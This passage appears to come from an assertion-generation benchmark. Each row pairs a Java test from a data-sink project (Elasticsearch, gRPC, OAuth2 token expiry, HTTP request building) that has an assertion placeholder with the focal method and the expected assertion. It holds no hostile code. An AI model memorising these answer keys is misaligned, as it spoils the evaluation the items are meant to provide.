getHttpHosts(String esConnectionUrls, FirehoseInstrumentation firehoseInstrumentation) { if (esConnectionUrls != null && !esConnectionUrls.isEmpty()) { String[] esNodes = esConnectionUrls.trim().split("",""); HttpHost[] httpHosts = new HttpHost[esNodes.length]; for (int i = 0; i < esNodes.length; i++) { String[] node = esNodes[i].trim().split("":""); if (node.length <= 1) { throw new IllegalArgumentException(""SINK_ES_CONNECTION_URLS should contain host and port both""); } httpHosts[i] = new HttpHost(node[0].trim(), Integer.parseInt(node[1].trim())); } return httpHosts; } else { firehoseInstrumentation.logError(""No connection URL found""); throw new IllegalArgumentException(""SINK_ES_CONNECTION_URLS is empty or null""); } }"	assertEquals(IllegalArgumentException.class, e.getClass())
"shouldReturnEmptyBlackListRetryStatusCodesAsEmptyList() { String inputRetryStatusCodeBlacklist = """"; List<String> statusCodesAsList = EsSinkFactory.getStatusCodesAsList(inputRetryStatusCodeBlacklist); ""<AssertPlaceHolder>""; }
getStatusCodesAsList(String esRetryStatusCodeBlacklist) { return Arrays .stream(esRetryStatusCodeBlacklist.split("","")) .map(String::trim) .filter(s -> !s.isEmpty()) .collect(Collectors.toList()); }"	assertEquals(0, statusCodesAsList.size())
"shouldReturnInsertRequestHandler() { when(esSinkConfig.isSinkEsModeUpdateOnlyEnable()).thenReturn(false); EsRequestHandlerFactory esRequestHandlerFactory = new EsRequestHandlerFactory(esSinkConfig, firehoseInstrumentation, ""id"", EsSinkMessageType.JSON, jsonSerializer, ""customer_id"", ""booking"", ""order_number""); EsRequestHandler requestHandler = esRequestHandlerFactory.getRequestHandler();  verify(firehoseInstrumentation, times(1)).logInfo(""ES request mode: {}"", EsSinkRequestType.INSERT_OR_UPDATE); ""<AssertPlaceHolder>""; }
getRequestHandler() { EsSinkRequestType esSinkRequestType = esSinkConfig.isSinkEsModeUpdateOnlyEnable() ? EsSinkRequestType.UPDATE_ONLY : EsSinkRequestType.INSERT_OR_UPDATE; firehoseInstrumentation.logInfo(""ES request mode: {}"", esSinkRequestType);  ArrayList<EsRequestHandler> esRequestHandlers = new ArrayList<>(); esRequestHandlers.add(new EsUpdateRequestHandler(messageType, jsonSerializer, esTypeName, esIndexName, esSinkRequestType, esIdFieldName, esRoutingKeyName)); esRequestHandlers.add(new EsUpsertRequestHandler(messageType, jsonSerializer, esTypeName, esIndexName, esSinkRequestType, esIdFieldName, esRoutingKeyName));  return esRequestHandlers .stream() .filter(EsRequestHandler::canCreate) .findFirst() .orElseThrow(() -> new IllegalArgumentException(""Es Request Type "" + esSinkRequestType.name() + "" not supported"")); }"	assertEquals(EsUpsertRequestHandler.class, requestHandler.getClass())
"shouldReturnUpdateRequestHandler() { when(esSinkConfig.isSinkEsModeUpdateOnlyEnable()).thenReturn(true); EsRequestHandlerFactory esRequestHandlerFactory = new EsRequestHandlerFactory(esSinkConfig, firehoseInstrumentation, ""id"", EsSinkMessageType.JSON, jsonSerializer, ""customer_id"", ""booking"", ""order_number""); EsRequestHandler requestHandler = esRequestHandlerFactory.getRequestHandler();  verify(firehoseInstrumentation, times(1)).logInfo(""ES request mode: {}"", EsSinkRequestType.UPDATE_ONLY); ""<AssertPlaceHolder>""; }
getRequestHandler() { EsSinkRequestType esSinkRequestType = esSinkConfig.isSinkEsModeUpdateOnlyEnable() ? EsSinkRequestType.UPDATE_ONLY : EsSinkRequestType.INSERT_OR_UPDATE; firehoseInstrumentation.logInfo(""ES request mode: {}"", esSinkRequestType);  ArrayList<EsRequestHandler> esRequestHandlers = new ArrayList<>(); esRequestHandlers.add(new EsUpdateRequestHandler(messageType, jsonSerializer, esTypeName, esIndexName, esSinkRequestType, esIdFieldName, esRoutingKeyName)); esRequestHandlers.add(new EsUpsertRequestHandler(messageType, jsonSerializer, esTypeName, esIndexName, esSinkRequestType, esIdFieldName, esRoutingKeyName));  return esRequestHandlers .stream() .filter(EsRequestHandler::canCreate) .findFirst() .orElseThrow(() -> new IllegalArgumentException(""Es Request Type "" + esSinkRequestType.name() + "" not supported"")); }"	assertEquals(EsUpdateRequestHandler.class, requestHandler.getClass())
"shouldCallTheGivenRpcMethodAndGetSuccessResponse() { doAnswerProtoReponse(TestGrpcResponse.newBuilder() .setSuccess(true) .build()).when(testGrpcService).testRpcMethod(any(TestGrpcRequest.class), any()); TestGrpcRequest request = TestGrpcRequest.newBuilder() .setField1(""field1"") .setField2(""field2"") .build(); DynamicMessage response = grpcClient.execute(request.toByteArray(), headers); System.out.println(response.toString()); ""<AssertPlaceHolder>""; }
execute(byte[] logMessage, Headers headers) {  MethodDescriptor.Marshaller<byte[]> marshaller = getMarshaller(); DynamicMessage dynamicMessage;  try {   Metadata metadata = new Metadata(); for (Header header : headers) { metadata.put(Metadata.Key.of(header.key(), Metadata.ASCII_STRING_MARSHALLER), new String(header.value())); }  Channel decoratedChannel = ClientInterceptors.intercept(managedChannel, MetadataUtils.newAttachHeadersInterceptor(metadata)); byte[] response = ClientCalls.blockingUnaryCall( decoratedChannel, MethodDescriptor.newBuilder(marshaller, marshaller) .setType(MethodDescriptor.MethodType.UNARY) .setFullMethodName(grpcSinkConfig.getSinkGrpcMethodUrl()) .build(), CallOptions.DEFAULT, logMessage);  dynamicMessage = stencilClient.parse(grpcSinkConfig.getSinkGrpcResponseSchemaProtoClass(), response);  } catch (Exception e) { firehoseInstrumentation.logWarn(e.getMessage()); dynamicMessage = DynamicMessage.newBuilder(this.stencilClient.get(this.grpcSinkConfig.getSinkGrpcResponseSchemaProtoClass())).build();  }  return dynamicMessage; }"	"assertTrue(Boolean.parseBoolean(String.valueOf(response.getField(TestGrpcResponse.getDescriptor().findFieldByName(""success"")))))"
"shouldCallTheGivenRpcMethodWithHeaders() { doAnswerProtoReponse(TestGrpcResponse.newBuilder() .setSuccess(true) .build()).when(testGrpcService).testRpcMethod(any(TestGrpcRequest.class), any()); TestGrpcRequest request = TestGrpcRequest.newBuilder() .setField1(""field1"") .setField2(""field2"") .build(); String headerValue1 = ""test-value-1""; String headerValue2 = ""test-value-2""; headers.add(new RecordHeader(HEADER_KEYS.get(0), headerValue1.getBytes())); headers.add(new RecordHeader(HEADER_KEYS.get(1), headerValue2.getBytes())); grpcClient.execute(request.toByteArray(), headers);  ""<AssertPlaceHolder>""; }
execute(byte[] logMessage, Headers headers) {  MethodDescriptor.Marshaller<byte[]> marshaller = getMarshaller(); DynamicMessage dynamicMessage;  try {   Metadata metadata = new Metadata(); for (Header header : headers) { metadata.put(Metadata.Key.of(header.key(), Metadata.ASCII_STRING_MARSHALLER), new String(header.value())); }  Channel decoratedChannel = ClientInterceptors.intercept(managedChannel, MetadataUtils.newAttachHeadersInterceptor(metadata)); byte[] response = ClientCalls.blockingUnaryCall( decoratedChannel, MethodDescriptor.newBuilder(marshaller, marshaller) .setType(MethodDescriptor.MethodType.UNARY) .setFullMethodName(grpcSinkConfig.getSinkGrpcMethodUrl()) .build(), CallOptions.DEFAULT, logMessage);  dynamicMessage = stencilClient.parse(grpcSinkConfig.getSinkGrpcResponseSchemaProtoClass(), response);  } catch (Exception e) { firehoseInstrumentation.logWarn(e.getMessage()); dynamicMessage = DynamicMessage.newBuilder(this.stencilClient.get(this.grpcSinkConfig.getSinkGrpcResponseSchemaProtoClass())).build();  }  return dynamicMessage; }"	assertEquals(headerTestInterceptor.getKeyValues(), Arrays.asList(headerValue1, headerValue2))
"shouldCallTheGivenRpcMethodAndGetErrorResponse() { doAnswerProtoReponse(TestGrpcResponse.newBuilder() .setSuccess(false) .addError(Error.newBuilder(). setCode(""101"") .setEntity(""some-entity"").build()) .build()).when(testGrpcService).testRpcMethod(any(TestGrpcRequest.class), any()); TestGrpcRequest request = TestGrpcRequest.newBuilder() .setField1(""field1"") .setField2(""field2"") .build(); DynamicMessage response = grpcClient.execute(request.toByteArray(), headers); ""<AssertPlaceHolder>""; }
execute(byte[] logMessage, Headers headers) {  MethodDescriptor.Marshaller<byte[]> marshaller = getMarshaller(); DynamicMessage dynamicMessage;  try {   Metadata metadata = new Metadata(); for (Header header : headers) { metadata.put(Metadata.Key.of(header.key(), Metadata.ASCII_STRING_MARSHALLER), new String(header.value())); }  Channel decoratedChannel = ClientInterceptors.intercept(managedChannel, MetadataUtils.newAttachHeadersInterceptor(metadata)); byte[] response = ClientCalls.blockingUnaryCall( decoratedChannel, MethodDescriptor.newBuilder(marshaller, marshaller) .setType(MethodDescriptor.MethodType.UNARY) .setFullMethodName(grpcSinkConfig.getSinkGrpcMethodUrl()) .build(), CallOptions.DEFAULT, logMessage);  dynamicMessage = stencilClient.parse(grpcSinkConfig.getSinkGrpcResponseSchemaProtoClass(), response);  } catch (Exception e) { firehoseInstrumentation.logWarn(e.getMessage()); dynamicMessage = DynamicMessage.newBuilder(this.stencilClient.get(this.grpcSinkConfig.getSinkGrpcResponseSchemaProtoClass())).build();  }  return dynamicMessage; }"	"assertFalse(Boolean.parseBoolean(String.valueOf(response.getField(response.getDescriptorForType().findFieldByName(""success"")))))"
"shouldReturnErrorWhenBytesAreNull() { DynamicMessage response = grpcClient.execute(null, headers); ""<AssertPlaceHolder>""; }
execute(byte[] logMessage, Headers headers) {  MethodDescriptor.Marshaller<byte[]> marshaller = getMarshaller(); DynamicMessage dynamicMessage;  try {   Metadata metadata = new Metadata(); for (Header header : headers) { metadata.put(Metadata.Key.of(header.key(), Metadata.ASCII_STRING_MARSHALLER), new String(header.value())); }  Channel decoratedChannel = ClientInterceptors.intercept(managedChannel, MetadataUtils.newAttachHeadersInterceptor(metadata)); byte[] response = ClientCalls.blockingUnaryCall( decoratedChannel, MethodDescriptor.newBuilder(marshaller, marshaller) .setType(MethodDescriptor.MethodType.UNARY) .setFullMethodName(grpcSinkConfig.getSinkGrpcMethodUrl()) .build(), CallOptions.DEFAULT, logMessage);  dynamicMessage = stencilClient.parse(grpcSinkConfig.getSinkGrpcResponseSchemaProtoClass(), response);  } catch (Exception e) { firehoseInstrumentation.logWarn(e.getMessage()); dynamicMessage = DynamicMessage.newBuilder(this.stencilClient.get(this.grpcSinkConfig.getSinkGrpcResponseSchemaProtoClass())).build();  }  return dynamicMessage; }"	"assertFalse(Boolean.parseBoolean(String.valueOf(response.getField(response.getDescriptorForType().findFieldByName(""success"")))))"
"shouldReturnErrorWhenGrpcException() { doThrow(new RuntimeException(""error"")).when(testGrpcService).testRpcMethod(any(TestGrpcRequest.class), any()); TestGrpcRequest request = TestGrpcRequest.newBuilder() .setField1(""field1"") .setField2(""field2"") .build(); DynamicMessage response = grpcClient.execute(request.toByteArray(), headers); ""<AssertPlaceHolder>""; }
execute(byte[] logMessage, Headers headers) {  MethodDescriptor.Marshaller<byte[]> marshaller = getMarshaller(); DynamicMessage dynamicMessage;  try {   Metadata metadata = new Metadata(); for (Header header : headers) { metadata.put(Metadata.Key.of(header.key(), Metadata.ASCII_STRING_MARSHALLER), new String(header.value())); }  Channel decoratedChannel = ClientInterceptors.intercept(managedChannel, MetadataUtils.newAttachHeadersInterceptor(metadata)); byte[] response = ClientCalls.blockingUnaryCall( decoratedChannel, MethodDescriptor.newBuilder(marshaller, marshaller) .setType(MethodDescriptor.MethodType.UNARY) .setFullMethodName(grpcSinkConfig.getSinkGrpcMethodUrl()) .build(), CallOptions.DEFAULT, logMessage);  dynamicMessage = stencilClient.parse(grpcSinkConfig.getSinkGrpcResponseSchemaProtoClass(), response);  } catch (Exception e) { firehoseInstrumentation.logWarn(e.getMessage()); dynamicMessage = DynamicMessage.newBuilder(this.stencilClient.get(this.grpcSinkConfig.getSinkGrpcResponseSchemaProtoClass())).build();  }  return dynamicMessage; }"	"assertFalse(Boolean.parseBoolean(String.valueOf(response.getField(response.getDescriptorForType().findFieldByName(""success"")))))"
"DeserializerException { when(testGrpcService.bindService()).thenCallRealMethod();  Server server = ServerBuilder .forPort(5000) .addService(testGrpcService.bindService()) .build() .start();  Map<String, String> config = new HashMap<>(); config.put(""SINK_GRPC_METHOD_URL"", ""org.raystack.firehose.consumer.TestServer/TestRpcMethod""); config.put(""SINK_GRPC_SERVICE_HOST"", ""localhost""); config.put(""SINK_GRPC_SERVICE_PORT"", ""5000"");   Sink sink = GrpcSinkFactory.create(config, statsDReporter, stencilClient);  Assert.""<AssertPlaceHolder>""; server.shutdownNow(); }
create(Map<String, String> configuration, StatsDReporter statsDReporter, StencilClient stencilClient) { GrpcSinkConfig grpcConfig = ConfigFactory.create(GrpcSinkConfig.class, configuration); FirehoseInstrumentation firehoseInstrumentation = new FirehoseInstrumentation(statsDReporter, GrpcSinkFactory.class); String grpcSinkConfig = String.format(""\n\tService host: %s\n\tService port: %s\n\tMethod url: %s\n\tResponse proto schema: %s"", grpcConfig.getSinkGrpcServiceHost(), grpcConfig.getSinkGrpcServicePort(), grpcConfig.getSinkGrpcMethodUrl(), grpcConfig.getSinkGrpcResponseSchemaProtoClass()); firehoseInstrumentation.logDebug(grpcSinkConfig);  ManagedChannel managedChannel = ManagedChannelBuilder.forAddress(grpcConfig.getSinkGrpcServiceHost(), grpcConfig.getSinkGrpcServicePort()).usePlaintext().build();  GrpcClient grpcClient = new GrpcClient(new FirehoseInstrumentation(statsDReporter, GrpcClient.class), grpcConfig, managedChannel, stencilClient); firehoseInstrumentation.logInfo(""GRPC connection established"");  return new GrpcSink(new FirehoseInstrumentation(statsDReporter, GrpcSink.class), grpcClient, stencilClient); }"	assertNotNull(sink)
"shouldReturnTrueWhenExpireTimeIsLessThan60Sec() { oAuth2AccessToken = new OAuth2AccessToken(accessToken, 55);  Assert.""<AssertPlaceHolder>""; }
isExpired() { final long oneMinute = 60L; return this.getExpiresIn() <= oneMinute; }"	assertTrue(oAuth2AccessToken.isExpired())
"shouldReturnTrueWhenExpireTimeIs60Sec() { oAuth2AccessToken = new OAuth2AccessToken(accessToken, 60);  Assert.""<AssertPlaceHolder>""; }
isExpired() { final long oneMinute = 60L; return this.getExpiresIn() <= oneMinute; }"	assertTrue(oAuth2AccessToken.isExpired())
"shouldReturnFalseWhenExpireTimeIsMoreThan60Sec() { oAuth2AccessToken = new OAuth2AccessToken(accessToken, 62);  Assert.""<AssertPlaceHolder>""; }
isExpired() { final long oneMinute = 60L; return this.getExpiresIn() <= oneMinute; }"	assertFalse(oAuth2AccessToken.isExpired())
"shouldReturnExpirationTimeAsPassedInParamaters() { Long expiresIn = 65L; oAuth2AccessToken = new OAuth2AccessToken(accessToken, 65);  Assert.""<AssertPlaceHolder>""; }
getExpiresIn() { return (this.expirationTimeMs - DateTimeUtils.currentTimeMillis()) / MILLIS; }"	assertEquals(expiresIn, oAuth2AccessToken.getExpiresIn())
"shouldReturnDefaultExpirationTimeWhenNotPassedInParamaters() { Long expiresIn = 3600L; oAuth2AccessToken = new OAuth2AccessToken(accessToken, null);  Assert.""<AssertPlaceHolder>""; }
getExpiresIn() { return (this.expirationTimeMs - DateTimeUtils.currentTimeMillis()) / MILLIS; }"	assertEquals(expiresIn, oAuth2AccessToken.getExpiresIn())
"shouldReturnBatchRequestWhenPrameterSourceIsDisabledAndServiceUrlIsConstant() { configuration.put(""SINK_HTTP_SERVICE_URL"", ""http://127.0.0.1:1080/api""); httpSinkConfig = ConfigFactory.create(HttpSinkConfig.class, configuration);  Request request = new RequestFactory(statsDReporter, httpSinkConfig, stencilClient, uriParser).createRequest();  ""<AssertPlaceHolder>""; }
createRequest() { JsonBody body = createBody(); HttpSinkRequestMethodType httpSinkRequestMethodType = httpSinkConfig.getSinkHttpRequestMethod(); HeaderBuilder headerBuilder = new HeaderBuilder(httpSinkConfig.getSinkHttpHeaders()); UriBuilder uriBuilder = new UriBuilder(httpSinkConfig.getSinkHttpServiceUrl(), uriParser); RequestEntityBuilder requestEntityBuilder = new RequestEntityBuilder();  List<Request> requests = Arrays.asList( new SimpleRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType), new DynamicUrlRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType), new ParameterizedHeaderRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType, getProtoToFieldMapper()), new ParameterizedUriRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType, getProtoToFieldMapper()));  Request request = requests.stream() .filter(Request::canProcess) .findFirst() .orElse(new SimpleRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType)); firehoseInstrumentation.logInfo(""Request type: {}"", request.getClass());  return request.setRequestStrategy(headerBuilder, uriBuilder, requestEntityBuilder); }"	assertTrue(request instanceof SimpleRequest)
"shouldReturnDynamicUrlRequestWhenPrameterSourceIsDisabledAndServiceUrlIsNotParametrised() { configuration.put(""SINK_HTTP_SERVICE_URL"", ""http://127.0.0.1:1080/api,%s""); httpSinkConfig = ConfigFactory.create(HttpSinkConfig.class, configuration);  Request request = new RequestFactory(statsDReporter, httpSinkConfig, stencilClient, uriParser).createRequest();  ""<AssertPlaceHolder>""; }
createRequest() { JsonBody body = createBody(); HttpSinkRequestMethodType httpSinkRequestMethodType = httpSinkConfig.getSinkHttpRequestMethod(); HeaderBuilder headerBuilder = new HeaderBuilder(httpSinkConfig.getSinkHttpHeaders()); UriBuilder uriBuilder = new UriBuilder(httpSinkConfig.getSinkHttpServiceUrl(), uriParser); RequestEntityBuilder requestEntityBuilder = new RequestEntityBuilder();  List<Request> requests = Arrays.asList( new SimpleRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType), new DynamicUrlRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType), new ParameterizedHeaderRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType, getProtoToFieldMapper()), new ParameterizedUriRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType, getProtoToFieldMapper()));  Request request = requests.stream() .filter(Request::canProcess) .findFirst() .orElse(new SimpleRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType)); firehoseInstrumentation.logInfo(""Request type: {}"", request.getClass());  return request.setRequestStrategy(headerBuilder, uriBuilder, requestEntityBuilder); }"	assertTrue(request instanceof DynamicUrlRequest)
"shouldReturnParameterizedRequstWhenParameterSourceIsNotDisableAndPlacementTypeIsHeader() { configuration.put(""SINK_HTTP_PARAMETER_SOURCE"", ""key""); configuration.put(""SINK_HTTP_PARAMETER_PLACEMENT"", ""header""); configuration.put(""SINK_HTTP_SERVICE_URL"", ""http://127.0.0.1:1080/api,%s""); httpSinkConfig = ConfigFactory.create(HttpSinkConfig.class, configuration);  Request request = new RequestFactory(statsDReporter, httpSinkConfig, stencilClient, uriParser).createRequest();  ""<AssertPlaceHolder>""; }
createRequest() { JsonBody body = createBody(); HttpSinkRequestMethodType httpSinkRequestMethodType = httpSinkConfig.getSinkHttpRequestMethod(); HeaderBuilder headerBuilder = new HeaderBuilder(httpSinkConfig.getSinkHttpHeaders()); UriBuilder uriBuilder = new UriBuilder(httpSinkConfig.getSinkHttpServiceUrl(), uriParser); RequestEntityBuilder requestEntityBuilder = new RequestEntityBuilder();  List<Request> requests = Arrays.asList( new SimpleRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType), new DynamicUrlRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType), new ParameterizedHeaderRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType, getProtoToFieldMapper()), new ParameterizedUriRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType, getProtoToFieldMapper()));  Request request = requests.stream() .filter(Request::canProcess) .findFirst() .orElse(new SimpleRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType)); firehoseInstrumentation.logInfo(""Request type: {}"", request.getClass());  return request.setRequestStrategy(headerBuilder, uriBuilder, requestEntityBuilder); }"	assertTrue(request instanceof ParameterizedHeaderRequest)
"shouldReturnParameterizedRequstWhenParameterSourceIsNotDisableAndPlacementTypeIsQuery() { configuration.put(""SINK_HTTP_PARAMETER_SOURCE"", ""key""); configuration.put(""SINK_HTTP_PARAMETER_PLACEMENT"", ""query""); configuration.put(""SINK_HTTP_SERVICE_URL"", ""http://127.0.0.1:1080/api,%s""); httpSinkConfig = ConfigFactory.create(HttpSinkConfig.class, configuration);  Request request = new RequestFactory(statsDReporter, httpSinkConfig, stencilClient, uriParser).createRequest();  ""<AssertPlaceHolder>""; }
createRequest() { JsonBody body = createBody(); HttpSinkRequestMethodType httpSinkRequestMethodType = httpSinkConfig.getSinkHttpRequestMethod(); HeaderBuilder headerBuilder = new HeaderBuilder(httpSinkConfig.getSinkHttpHeaders()); UriBuilder uriBuilder = new UriBuilder(httpSinkConfig.getSinkHttpServiceUrl(), uriParser); RequestEntityBuilder requestEntityBuilder = new RequestEntityBuilder();  List<Request> requests = Arrays.asList( new SimpleRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType), new DynamicUrlRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType), new ParameterizedHeaderRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType, getProtoToFieldMapper()), new ParameterizedUriRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType, getProtoToFieldMapper()));  Request request = requests.stream() .filter(Request::canProcess) .findFirst() .orElse(new SimpleRequest(statsDReporter, httpSinkConfig, body, httpSinkRequestMethodType)); firehoseInstrumentation.logInfo(""Request type: {}"", request.getClass());  return request.setRequestStrategy(headerBuilder, uriBuilder, requestEntityBuilder); }"	assertTrue(request instanceof ParameterizedUriRequest)
"shouldReturnSameSizeOfBodyAsEsbMessage() { JsonBody jsonBody = new JsonBody(messageSerializer);  List<String> bodyContent; try { bodyContent = jsonBody.serialize(messages); } catch (DeserializerException e) { throw new RuntimeException(e.toString()); } ""<AssertPlaceHolder>""; }
serialize(List<Message> messages) throws DeserializerException { List<String> serializedBody = new ArrayList<String>(); for (Message message : messages) { serializedBody.add(jsonSerializer.serialize(message)); } return serializedBody; }"	assertEquals(1, bodyContent.size())
"shouldReturnSerializedValueOfMessage() { List<String> contentString; String mockSerializeResult = ""{""MockSerializer"": []}""; try { when(messageSerializer.serialize(message)).thenReturn(mockSerializeResult);  JsonBody jsonBody = new JsonBody(messageSerializer); contentString = jsonBody.serialize(messages);  } catch (DeserializerException e) { throw new RuntimeException(e.toString()); }  ""<AssertPlaceHolder>""; }
serialize(List<Message> messages) throws DeserializerException { List<String> serializedBody = new ArrayList<String>(); for (Message message : messages) { serializedBody.add(jsonSerializer.serialize(message)); } return serializedBody; }"	assertEquals(mockSerializeResult, contentString.get(0))
"URISyntaxException { Message message1 = new Message(new byte[]{10, 20}, new byte[]{1, 2}, ""sample-topic"", 0, 100); Message message2 = new Message(new byte[]{10, 20}, new byte[]{1, 2}, ""sample-topic"", 0, 100); messages = new ArrayList<>(); messages.add(message1); messages.add(message2);  BatchRequestCreator batchRequestCreator = new BatchRequestCreator(firehoseInstrumentation, uriBuilder, headerBuilder, HttpSinkRequestMethodType.PUT, jsonBody, httpSinkConfig); List<HttpEntityEnclosingRequestBase> requests = batchRequestCreator.create(messages, requestEntityBuilder);  ""<AssertPlaceHolder>""; verify(firehoseInstrumentation, times(1)).logDebug(""\nRequest URL: {}\nRequest headers: {}\nRequest content: {}\nRequest method: {}"", uriBuilder.build(), headerBuilder.build(), jsonBody.serialize(messages), HttpSinkRequestMethodType.PUT); }
create(List<Message> messages, RequestEntityBuilder requestEntityBuilder) throws URISyntaxException { URI uri = uriBuilder.build(); HttpEntityEnclosingRequestBase request = HttpRequestMethodFactory .create(uri, method);  Map<String, String> headerMap = headerBuilder.build(); headerMap.forEach(request::addHeader); String messagesString = jsonBody.serialize(messages).toString();  if (!(method == HttpSinkRequestMethodType.DELETE && !httpSinkConfig.getSinkHttpDeleteBodyEnable())) { request.setEntity(requestEntityBuilder.buildHttpEntity(messagesString)); firehoseInstrumentation.logDebug(""\nRequest URL: {}\nRequest headers: {}\nRequest content: {}\nRequest method: {}"", uri, headerMap, jsonBody.serialize(messages), method); } else { firehoseInstrumentation.logDebug(""\nRequest URL: {}\nRequest headers: {}\nRequest content: no body\nRequest method: {}"", uri, headerMap, method); } return Collections.singletonList(request); }"	assertEquals(1, requests.size())
"URISyntaxException { Message message1 = new Message(new byte[]{10, 20}, new byte[]{1, 2}, ""sample-topic"", 0, 100); Message message2 = new Message(new byte[]{10, 20}, new byte[]{1, 2}, ""sample-topic"", 0, 100); ArrayList<Message> messages = new ArrayList<>(); messages.add(message1); messages.add(message2);  ArrayList<String> serializedMessages = new ArrayList<>(); serializedMessages.add(""dummyMessage1""); serializedMessages.add(""dummyMessage2""); when(jsonBody.serialize(messages)).thenReturn(serializedMessages);  IndividualRequestCreator individualRequestCreator = new IndividualRequestCreator(firehoseInstrumentation, uriBuilder, headerBuilder, HttpSinkRequestMethodType.PUT, jsonBody, httpSinkConfig); List<HttpEntityEnclosingRequestBase> requests = individualRequestCreator.create(messages, requestEntityBuilder);  ""<AssertPlaceHolder>""; verify(firehoseInstrumentation, times(1)).logDebug(""\nRequest URL: {}\nRequest headers: {}\nRequest content: {}\nRequest method: {}"", uriBuilder.build(), headerBuilder.build(), jsonBody.serialize(messages).get(0), HttpSinkRequestMethodType.PUT); verify(firehoseInstrumentation, times(1)).logDebug(""\nRequest URL: {}\nRequest headers: {}\nRequest content: {}\nRequest method: {}"", uriBuilder.build(), headerBuilder.build(), jsonBody.serialize(messages).get(1), HttpSinkRequestMethodType.PUT); }
create(List<Message> messages, RequestEntityBuilder entity) throws URISyntaxException { List<HttpEntityEnclosingRequestBase> requests = new ArrayList<>(); List<String> bodyContents = jsonBody.serialize(messages); for (int i = 0; i < messages.size(); i++) { Message message = messages.get(i); URI requestUrl = uriBuilder.build(message); HttpEntityEnclosingRequestBase request = HttpRequestMethodFactory.create(requestUrl, method);  Map<String, String> headerMap = headerBuilder.build(message); headerMap.forEach(request::addHeader); if (!(method == HttpSinkRequestMethodType.DELETE && !httpSinkConfig.getSinkHttpDeleteBodyEnable())) { request.setEntity(entity.buildHttpEntity(bodyContents.get(i)));  firehoseInstrumentation.logDebug(""\nRequest URL: {}\nRequest headers: {}\nRequest content: {}\nRequest method: {}"", requestUrl, headerMap, bodyContents.get(i), method); } else { firehoseInstrumentation.logDebug(""\nRequest URL: {}\nRequest headers: {}\nRequest content: no body\nRequest method: {}"", requestUrl, headerMap, method); } requests.add(request); } return requests; }"	assertEquals(2, requests.size())
"shouldAddBaseHeaderPerMessageIfNotParameterized() { String headerConfig = ""content-type:json""; HeaderBuilder headerBuilder = new HeaderBuilder(headerConfig);  Map<String, String> header = headerBuilder.build(message); ""<AssertPlaceHolder>""; }
build(Message message) { Map<String, String> baseHeaders = build(); if (protoToFieldMapper == null) { return baseHeaders; }  // flow for parameterized headers Map<String, Object> paramMap = protoToFieldMapper .getFields((httpSinkParameterSourceType == HttpSinkParameterSourceType.KEY) ? message.getLogKey() : message.getLogMessage());  Map<String, String> parameterizedHeaders = paramMap.entrySet().stream() .collect(Collectors.toMap(Map.Entry::getKey, e -> e.getValue().toString())); baseHeaders.putAll(parameterizedHeaders); return baseHeaders; }"	"assertEquals(""json"", header.get(""content-type""))"
"shouldHaveExtraParameterizedHeaderIfParameterizedHeaderEnabled() { String headerConfig = ""content-type:json""; Map<String, Object> mockParamMap = Collections.singletonMap(""orderNumber"", ""RB_1234""); when(protoToFieldMapper.getFields(message.getLogMessage())).thenReturn(mockParamMap);  HeaderBuilder headerBuilder = new HeaderBuilder(headerConfig) .withParameterizedHeader(protoToFieldMapper, HttpSinkParameterSourceType.MESSAGE);  Map<String, String> header = headerBuilder.build(message);  ""<AssertPlaceHolder>""; }
build(Message message) { Map<String, String> baseHeaders = build(); if (protoToFieldMapper == null) { return baseHeaders; }  // flow for parameterized headers Map<String, Object> paramMap = protoToFieldMapper .getFields((httpSinkParameterSourceType == HttpSinkParameterSourceType.KEY) ? message.getLogKey() : message.getLogMessage());  Map<String, String> parameterizedHeaders = paramMap.entrySet().stream() .collect(Collectors.toMap(Map.Entry::getKey, e -> e.getValue().toString())); baseHeaders.putAll(parameterizedHeaders); return baseHeaders; }"	"assertEquals(""RB_1234"", header.get(""orderNumber""))"
"shouldProcessForParametrizedHeaders() { when(httpSinkConfig.getSinkHttpParameterSource()).thenReturn(HttpSinkParameterSourceType.MESSAGE); when(httpSinkConfig.getSinkHttpParameterPlacement()).thenReturn(HttpSinkParameterPlacementType.HEADER);  parameterizedHeaderRequest = new ParameterizedHeaderRequest(statsDReporter, httpSinkConfig, jsonBody, httpSinkRequestMethodType, protoToFieldMapper); boolean canProcess = parameterizedHeaderRequest.canProcess(); ""<AssertPlaceHolder>""; }
canProcess() { return httpSinkConfig.getSinkHttpParameterSource() != HttpSinkParameterSourceType.DISABLED && httpSinkConfig.getSinkHttpParameterPlacement() == HttpSinkParameterPlacementType.HEADER; }"	assertTrue(canProcess)
"shouldNotProcessIfParameterPlacementDisabled() { when(httpSinkConfig.getSinkHttpParameterSource()).thenReturn(HttpSinkParameterSourceType.DISABLED);  parameterizedHeaderRequest = new ParameterizedHeaderRequest(statsDReporter, httpSinkConfig, jsonBody, httpSinkRequestMethodType, protoToFieldMapper); boolean canProcess = parameterizedHeaderRequest.canProcess();  ""<AssertPlaceHolder>""; }
canProcess() { return httpSinkConfig.getSinkHttpParameterSource() != HttpSinkParameterSourceType.DISABLED && httpSinkConfig.getSinkHttpParameterPlacement() == HttpSinkParameterPlacementType.HEADER; }"	assertFalse(canProcess)
